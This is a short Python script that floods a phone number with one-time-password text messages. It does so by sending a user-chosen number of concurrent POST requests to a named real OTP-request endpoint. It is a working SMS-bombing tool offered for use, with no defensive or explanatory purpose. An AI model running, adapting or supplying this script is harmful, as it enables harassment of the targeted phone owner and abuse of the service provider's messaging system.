import requests
from concurrent.futures import ThreadPoolExecutor

url = "https://portal.ideabiz.lk/v2/user/otpRequest"

phone_number = input('Enter number (Ex: 0714845451) : ')

data = {
    'serviceNum': phone_number
}

def send_request():
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("OTP sent successfully!")
        else:
            print(f"Failed to send OTP. Status code: {response.status_code}")
            print(response.text)  # This will show the response content for debugging
    except requests.RequestException as e:
        print(f"Request failed: {e}")

sms_count = int(input('Enter SMS quantity : '))

with ThreadPoolExecutor(max_workers=sms_count) as executor:
    executor.map(lambda _: send_request(), range(sms_count))
